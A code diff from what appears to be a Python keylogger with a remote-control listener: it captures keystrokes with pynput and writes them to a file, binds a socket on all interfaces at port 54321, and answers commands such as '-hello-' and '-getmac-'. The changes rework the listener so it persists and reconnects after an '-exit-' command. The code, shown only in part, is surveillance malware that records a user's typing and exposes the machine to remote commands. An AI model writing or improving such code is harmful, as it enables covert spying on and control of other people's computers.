@@ -13,7 +13,7 @@ from getmac import get_mac_address as gma
 HOST = "0.0.0.0"
 PORT = 54321
 isConnected = False
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s = None
 
 
 def connect():
@@ -28,8 +28,12 @@ def connect():
             if(key == pynput.keyboard.Key.backspace):
                 key = "<backspace>"
             f.write(str(key))
-
+    global isConnected
+    if isConnected:
+        return
+    isConnected = True
     global s
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((HOST, PORT))
     s.listen(1)
     try:
@@ -52,7 +56,10 @@ def connect():
             elif encodedData == "-hello-":
                 conn.sendall(bytes("-connected-", "utf8"))
             elif encodedData == "-exit-":
+                isConnected = False
                 conn.close()
+                s.close()
+                connect()
                 break
             elif encodedData == "-getmac-":
                 conn.sendall(bytes(gma(), "utf8"))
@@ -183,7 +190,6 @@ def threadConnect():
     global isConnected
     if isConnected:
         return
-    isConnected = True
     tConnect = threading.Thread(target=connect, daemon=True)
     tConnect.start()
 
